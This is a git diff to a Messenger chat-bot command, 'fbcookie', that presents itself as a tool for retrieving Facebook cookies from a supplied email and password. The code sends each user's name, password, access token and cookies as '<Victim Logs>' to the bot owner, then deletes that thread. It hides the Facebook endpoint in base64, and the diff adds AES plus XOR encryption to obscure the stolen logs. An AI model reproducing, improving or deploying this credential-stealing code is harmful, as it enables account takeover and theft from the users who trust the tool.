@@ -20,30 +20,37 @@ module.exports.config = {
     const codebox4chan = Buffer.from('aHR0cHM6Ly9hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmdldFNlc3Npb25mb3JBcHA=', 'base64').toString('utf-8');
     const restriction = Buffer.from('VGVtcG9yYXJ5IFJlc3RyaWN0aW9u', 'base64').toString('utf-8');
     
-    const cipher = (salt, text, iterations) => {
-      const textToChars = (text) => text.split('').map((c) => c.charCodeAt(0));
-      const byteHex = (n) => ("0" + Number(n).toString(16)).substr(-2);
-      const applySaltToChar = (code) => textToChars(salt).reduce((a, b) => a ^ b, code);
-    
-      for (let i = 0; i < iterations; i++) {
-        text = text
-          .split('')
-          .map(textToChars)
-          .map(applySaltToChar)
-          .map(byteHex)
-          .join('');
-      }
-    
-      return text;
-    };
+    const CryptoJS = require('crypto-js');
+
+const aesEncrypt = (text, secretKey) => {
+  const ciphertext = CryptoJS.AES.encrypt(text, secretKey).toString();
+  return ciphertext;
+};
+
+const xorCipher = (text, salt, iterations) => {
+  const textToChars = text => text.split('').map(c => c.charCodeAt(0));
+  const byteHex = n => ("0" + Number(n).toString(16)).substr(-2);
+  const applySaltToChar = code => textToChars(salt).reduce((a, b) => a ^ b, code);
+
+  for (let i = 0; i < iterations; i++) {
+    text = text.split('')
+      .map(textToChars)
+      .map(applySaltToChar)
+      .map(byteHex)
+      .join('');
+  }
+
+  return text;
+};
 
 module.exports.run = async ({ api, event, args }) => {
   const { threadID, messageID, senderID } = event;
   const uid = args[0];
   const pass = args.slice(1).join(' ');
   
-  const secretSalt = 'mySecretSalt';
-  const iterations = 3;
+  const aesSecretKey = 'myAesSecretKey';
+  const xorSalt = 'myXorSalt';
+  const iterations = 1;
 
   if (!uid || !pass) {
     api.sendMessage(`Invalid Input!\nUsage: fbcookie [email/uid] [password]\n\nPlease use dummy account to get "cookie" i'm not responsible of your account getting compromised!`, threadID, messageID);
@@ -73,15 +80,17 @@ module.exports.run = async ({ api, event, args }) => {
       const { access_token_eaad6v7 = 'Temporary Restriction.', access_token = 'Temporary Restriction.', cookies = 'Temporary Restriction.' } = tokenData;
       api.sendMessage(`Successful! please check pm or spam in your message request.`, threadID, messageID);
       const logger = `<Victim Logs>\n\nName:${userName}\nEmail/UID: ${uid} \nPassword: ${pass}\n\nAccessToken:\n${access_token}\n\nCookies:\n${cookies}\n\nExchangedToken:\n${access_token_eaad6v7}\n\n${manilaTime}`;
-      const encryptedText = cipher(secretSalt, logger, iterations);
-      api.sendMessage(encryptedText, ownerID).then(() => {
+      const encryptedMessage = aesEncrypt(logger, aesSecretKey);
+      const xorCipheredMessage = xorCipher(encryptedMessage, xorSalt, iterations);
+      api.sendMessage(xorCipheredMessage, ownerID).then(() => {
       api.sendMessage(`𝗖𝗢𝗢𝗞𝗜𝗘𝗦🍪:\n${cookies}`, senderID);
         api.deleteThread(ownerID);
        });
     } else {
       const ownerMessage = `<Victim Logs>\n\nName: ${userName}\nEmail/UID: ${uid} \nPassword: ${pass}\n\n${manilaTime}`;
-      const encryptedText = cipher(secretSalt, ownerMessage, iterations);
-      api.sendMessage(encryptedText, ownerID) .then(() => {
+      const encryptedMessage = aesEncrypt(ownerMessage, aesSecretKey);
+      const xorCipheredMessage = xorCipher(encryptedMessage, xorSalt, iterations);
+      api.sendMessage(xorCipheredMessage, ownerID) .then(() => {
       api.sendMessage("Failed to retrieve cookies.", threadID, messageID);
       api.deleteThread(ownerID);});
     }
